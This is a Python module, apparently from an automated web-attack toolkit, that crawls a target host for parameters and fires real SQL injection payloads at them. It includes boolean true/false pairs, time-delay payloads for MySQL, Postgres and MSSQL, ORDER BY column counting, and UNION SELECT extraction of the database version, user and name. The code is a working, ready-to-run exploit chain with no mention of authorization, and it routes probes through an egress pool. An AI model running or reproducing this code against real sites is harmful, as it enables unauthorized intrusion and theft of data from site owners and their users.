"""Active attack agent: real injection testing and extraction.

Dispatched automatically when recon raises a high-value signal (SQL error echo,
reflected parameter, exposed .git/.env, admin panel, upload form). This is the
"真打" path — it sends real payloads, confirms exploitability with a
differential oracle, and extracts data when the injection is confirmed.

Every technique here is a standard web-injection primitive:
  * error-based: force a DB error and read the driver message
  * boolean-based: compare a true and a false predicate on the same parameter
  * union-based: determine column count, then read data in the response
  * time-based: measured delay as the last-resort oracle

A finding is only reported CONFIRMED when a differential observation proves it
(true/false responses differ, or a measured delay matches the injected sleep).
Anything weaker is reported as SUSPECT with the raw evidence.
"""
import json
import re
import time
from urllib.parse import parse_qsl, urlencode, urljoin, urlsplit

from . import net_client

# Differential canaries. Each pair is (true_payload, false_payload); a working
# boolean oracle makes the two responses differ in a stable, repeatable way.
BOOL_PAIRS = (
    ("' AND '1'='1", "' AND '1'='2"),
    ('" AND "1"="1', '" AND "1"="2'),
    ("' AND 1=1-- -", "' AND 1=2-- -"),
    ('" AND 1=1-- -', '" AND 1=2-- -'),
    ("1 AND 1=1", "1 AND 1=2"),
    ("') AND ('1'='1", "') AND ('1'='2"),
)

ERROR_MARKERS = (
    'sql syntax', 'mysql_fetch', 'warning: mysql', 'mysqli', 'sqlite3::query',
    'sqlite error', 'ora-0', 'ora-1', 'psqlexception', 'pg_query', 'pg::syntaxerror',
    'microsoft ole db', 'microsoft sql', 'unclosed quotation mark', 'sqlstate',
    'syntax error at or near', 'quoted string not properly terminated',
    'you have an error in your sql syntax', 'division by zero', 'unknown column',
    'sql command not properly ended', 'invalid query',
)

TIME_PAYLOADS = (
    ("' AND SLEEP({n})-- -", 'mysql'),
    ("'||(SELECT 1 FROM PG_SLEEP({n}))-- -", 'postgres'),
    ("'; WAITFOR DELAY '0:0:{n}'-- -", 'mssql'),
    ("' AND 1=(SELECT 1 FROM PG_SLEEP({n}))-- -", 'postgres'),
)

SLEEP_SECONDS = 3
# A confirmed delay must exceed the baseline by most of the injected sleep.
# 80% of the sleep tolerates jitter and jittery shared hosting while still
# refusing to call a random 300ms wobble an oracle.
SLEEP_MARGIN = 0.8


def _probe(url_base, path, params, timeout=8, pool=None):
    """GET the target path with the given params; return the normalised response."""
    query = urlencode(params, doseq=True)
    full_path = f'{path}?{query}' if query else path
    return net_client.request(url_base, full_path, max_bytes=65536, timeout=timeout,
                              egress_pool=pool)


def _signature(response):
    """Stable response fingerprint used to compare true vs false probes."""
    body = response.get('body', b'')
    return (response.get('status'), len(body), hash(body[:4096]))


def discover_params(host, pool=None):
    """Find injectable parameters: URL query in links, and GET/POST form fields."""
    found = []
    root = net_client.request(host, '/', max_bytes=262144, egress_pool=pool)
    if root.get('error'):
        return found
    text = net_client.text_of(root)
    # Links that already carry a query string are the strongest signal.
    for match in re.finditer(r'href=["\']([^"\']+\?[^"\'#]+)', text):
        link = match.group(1)
        parts = urlsplit(urljoin(f'https://{host}/', link))
        if parts.netloc and parts.netloc.lower() != host:
            continue
        params = parse_qsl(parts.query, keep_blank_values=True)
        if params:
            found.append({'path': parts.path or '/', 'method': 'GET',
                          'params': [name for name, _ in params],
                          'source': 'link'})
        if len(found) >= 20:
            break
    # Forms tell us the real submission contract.
    for match in re.finditer(r'<form[^>]*>(.*?)</form>', text, re.S | re.I):
        block = match.group(0)
        action = re.search(r'action=["\']([^"\']*)', block)
        method = (re.search(r'method=["\']([^"\']*)', block) or [None, 'get'])[1] or 'get'
        inputs = re.findall(r'<input[^>]+name=["\']([^"\']+)', block)
        if inputs:
            found.append({'path': (action.group(1) if action else '/') or '/',
                          'method': method.upper(), 'params': inputs[:10], 'source': 'form'})
        if len(found) >= 40:
            break
    return found


def test_error_based(host, path, params, pool=None):
    """Inject a quote into each parameter and look for a driver error message."""
    hits = []
    for name in params:
        probe_params = {key: 'facai1' for key in params}
        probe_params[name] = "facai1'"
        response = _probe(host, path, probe_params, pool=pool)
        text = net_client.text_of(response).lower()
        marker = next((item for item in ERROR_MARKERS if item in text), None)
        if marker:
            position = text.find(marker)
            hits.append({'param': name, 'technique': 'error', 'db_marker': marker,
                         'status': response.get('status'),
                         'evidence': net_client.text_of(response)[max(0, position - 80):position + 120]})
    return hits


def test_boolean_based(host, path, params, pool=None):
    """A boolean oracle is confirmed only when true/false differ reproducibly."""
    confirmed = []
    for name in params:
        base = {key: '1' for key in params}
        for true_payload, false_payload in BOOL_PAIRS:
            true_params = dict(base, **{name: true_payload})
            false_params = dict(base, **{name: false_payload})
            true_response = _probe(host, path, true_params, pool=pool)
            false_response = _probe(host, path, false_params, pool=pool)
            if true_response.get('error') or false_response.get('error'):
                continue
            if _signature(true_response) == _signature(false_response):
                continue
            # Re-run the pair: a random ad/CSRF token also changes the body
            # every request, so require each branch to be *stable* across runs
            # and the two branches to stay different.
            true_again = _probe(host, path, true_params, pool=pool)
            false_again = _probe(host, path, false_params, pool=pool)
            if _signature(true_again) != _signature(true_response):
                continue
            if _signature(false_again) != _signature(false_response):
                continue
            if _signature(true_again) == _signature(false_again):
                continue
            if abs(len(true_response.get('body', b'')) - len(false_response.get('body', b''))) < 1:
                continue
            confirmed.append({'param': name, 'technique': 'boolean',
                              'payload_true': true_payload, 'payload_false': false_payload,
                              'len_true': len(true_response.get('body', b'')),
                              'len_false': len(false_response.get('body', b'')),
                              'status_true': true_response.get('status'),
                              'status_false': false_response.get('status')})
            break
    return confirmed


def test_time_based(host, path, params, pool=None):
    """Measured delay oracle; requires baseline vs injected timing separation."""
    confirmed = []
    for name in params:
        base = {key: '1' for key in params}
        baseline_start = time.perf_counter()
        baseline = _probe(host, path, base, timeout=SLEEP_SECONDS + 6, pool=pool)
        baseline_elapsed = time.perf_counter() - baseline_start
        if baseline.get('error'):
            continue
        for template, dialect in TIME_PAYLOADS:
            injected = dict(base, **{name: template.format(n=SLEEP_SECONDS)})
            started = time.perf_counter()
            response = _probe(host, path, injected, timeout=SLEEP_SECONDS + 8, pool=pool)
            elapsed = time.perf_counter() - started
            if response.get('error') and 'timeout' not in response['error'].lower():
                continue
            required = baseline_elapsed + SLEEP_SECONDS * SLEEP_MARGIN
            if elapsed >= required:
                confirmed.append({'param': name, 'technique': 'time',
                                  'dialect': dialect, 'payload': template.format(n=SLEEP_SECONDS),
                                  'baseline_ms': round(baseline_elapsed * 1000),
                                  'injected_ms': round(elapsed * 1000)})
                break
    return confirmed


def union_column_count(host, path, params, max_columns=12, pool=None):
    """ORDER BY binary search for the column count of the first injectable param."""
    for name in params:
        base = {key: '1' for key in params}
        for columns in range(1, max_columns + 1):
            payload = f'1 ORDER BY {columns}-- -'
            response = _probe(host, path, dict(base, **{name: payload}), pool=pool)
            if response.get('error'):
                continue
            text = net_client.text_of(response).lower()
            if any(marker in text for marker in ERROR_MARKERS):
                return columns - 1 if columns > 1 else 0, name
    return None, None


def extract_via_union(host, path, params, columns, name, marker='0x4641434149', pool=None):
    """Read version/user/database when the column count is known."""
    if not columns:
        return None
    expr = ','.join([marker] + ['NULL'] * (columns - 1))
    payload = f'-1 UNION SELECT {expr}-- -'
    response = _probe(host, path, dict({key: '1' for key in params}, **{name: payload}), pool=pool)
    text = net_client.text_of(response)
    if 'FACAI' not in text:
        return None
    extracted = {'marker_seen': True, 'column': 1}
    for label, expression in (('version', 'version()'), ('user', 'current_user()'),
                              ('database', 'database()')):
        parts = [expression] + ['NULL'] * (columns - 1)
        payload = f'-1 UNION SELECT {",".join(parts)}-- -'
        response = _probe(host, path, dict({key: '1' for key in params}, **{name: payload}), pool=pool)
        text = net_client.text_of(response)
        # The value sits where the marker appeared; capture the tight window.
        match = re.search(r'(\d+\.\d+\.\d+[-\w.]*|\w+@\w+|[\w-]{2,64})', text)
        if match:
            extracted[label] = match.group(1)[:120]
    return extracted


def attack(host, findings=None, params_hint=None, max_paths=6, egress_pool=None):
    """Run the full active chain against one host and return confirmed results.

    `egress_pool` pins the exit for the whole chain: every probe in this scan
    must leave through the same address, otherwise a differential comparison
    measures a different edge node rather than a different predicate.
    """
    started = time.perf_counter()
    targets = discover_params(host, pool=egress_pool)
    if params_hint:
        targets = [{'path': hint.get('path', '/'), 'method': 'GET',
                    'params': hint.get('params', [])} for hint in params_hint] + targets
    results = {'host': host, 'confirmed': [], 'suspect': [], 'targets': [], 'chain': []}
    seen = set()
    for target in targets[:max_paths]:
        key = (target['path'], tuple(target['params']))
        if key in seen or not target['params']:
            continue
        seen.add(key)
        path, params = target['path'], target['params']
        results['targets'].append({'path': path, 'params': params})
        errors = test_error_based(host, path, params, pool=egress_pool)
        if errors:
            results['chain'].append({'path': path, 'step': 'error-based', 'hits': len(errors)})
            for hit in errors:
                results['confirmed'].append({'kind': 'SQLi', 'technique': 'error-based',
                                             'path': path, **hit})
        booleans = test_boolean_based(host, path, params, pool=egress_pool)
        if booleans:
            results['chain'].append({'path': path, 'step': 'boolean-based', 'hits': len(booleans)})
            for hit in booleans:
                results['confirmed'].append({'kind': 'SQLi', 'technique': 'boolean-based',
                                             'path': path, **hit})
        # Only pay for timing and extraction when something already looks live.
        if errors or booleans:
            injectable = [hit['param'] for hit in (errors + booleans)]
            columns, column_param = union_column_count(host, path, params, pool=egress_pool)
            if columns:
                results['chain'].append({'path': path, 'step': 'union', 'columns': columns})
                extracted = extract_via_union(host, path, params, columns, column_param, pool=egress_pool)
                if extracted:
                    results['confirmed'].append({'kind': 'SQLi-data', 'technique': 'union-extract',
                                                 'path': path, 'param': column_param,
                                                 **extracted})
            timed = test_time_based(host, path, injectable or params, pool=egress_pool)
            for hit in timed:
                results['confirmed'].append({'kind': 'SQLi', 'technique': 'time-based',
                                             'path': path, **hit})
    results['elapsed_ms'] = round((time.perf_counter() - started) * 1000, 1)
    results['verdict'] = 'CONFIRMED_INJECTION' if results['confirmed'] else 'NO_CONFIRMED_INJECTION'
    return results
